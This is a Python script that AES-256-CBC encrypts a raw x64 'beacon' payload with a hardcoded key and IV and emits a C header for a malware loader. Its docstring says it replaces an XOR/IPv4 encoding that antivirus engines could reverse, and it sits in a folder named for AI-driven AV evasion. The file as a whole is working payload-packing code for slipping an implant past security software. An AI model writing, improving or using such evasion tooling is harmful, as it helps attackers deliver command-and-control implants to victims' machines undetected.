#!/usr/bin/env python3
"""encrypt_aes.py — AES-256-CBC encrypt the raw beacon and emit payload_v8.h.
Uses the `cryptography` package (installed). Replaces the XOR+IPv4 pipeline:
the old XOR-0x5A/IPv4 layers were trivially reversible by AV engines.
"""
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

WORKDIR = r"D:\deepseek\ai-av-evasion-optimized"
BEACON = os.path.join(WORKDIR, "beacon_x64.bin")
OUT_H = os.path.join(WORKDIR, "payload_v8.h")

# Fixed random key/IV (embedded in loader too). 32-byte key, 16-byte IV.
KEY = bytes.fromhex("8F3A1C7E5B2D9460A1C8E4F20B7D9356E0A4F1B8C3D7E2F5A609B4C8D1E3F7A0")
IV  = bytes.fromhex("3D1E9A44C7B2F8056A93E1D4B7C2F0AE")

def main():
    data = open(BEACON, "rb").read()
    print("beacon size: %d" % len(data))

    padder = padding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()

    cipher = Cipher(algorithms.AES(KEY), modes.CBC(IV))
    enc = cipher.encryptor()
    ct = enc.update(padded) + enc.finalize()
    print("ciphertext size: %d (padded %d)" % (len(ct), len(padded)))
    print("ciphertext entropy check (first 64 bytes):")
    print(ct[:64].hex())

    # sanity: decrypt back
    dec = Cipher(algorithms.AES(KEY), modes.CBC(IV)).decryptor()
    pt = dec.update(ct) + dec.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    raw = unpadder.update(pt) + unpadder.finalize()
    assert raw == data, "roundtrip failed"
    print("roundtrip OK")

    lines = []
    lines.append("#ifndef PAYLOAD_V8_H")
    lines.append("#define PAYLOAD_V8_H")
    lines.append("")
    lines.append("#define ENC_BEACON_LEN %d" % len(ct))
    lines.append("")
    lines.append("static const BYTE aes_key[32] = { %s };" % ",".join("0x%02x" % b for b in KEY))
    lines.append("static const BYTE aes_iv[16]  = { %s };" % ",".join("0x%02x" % b for b in IV))
    lines.append("")
    lines.append("static const BYTE enc_beacon[ENC_BEACON_LEN] = {")
    for i in range(0, len(ct), 16):
        chunk = ct[i:i+16]
        lines.append("    " + ",".join("0x%02x" % b for b in chunk) + ",")
    lines.append("};")
    lines.append("")
    lines.append("#endif /* PAYLOAD_V8_H */")
    lines.append("")

    with open(OUT_H, "w") as f:
        f.write("\n".join(lines))
    print("wrote %s (%d bytes)" % (OUT_H, os.path.getsize(OUT_H)))

if __name__ == "__main__":
    main()
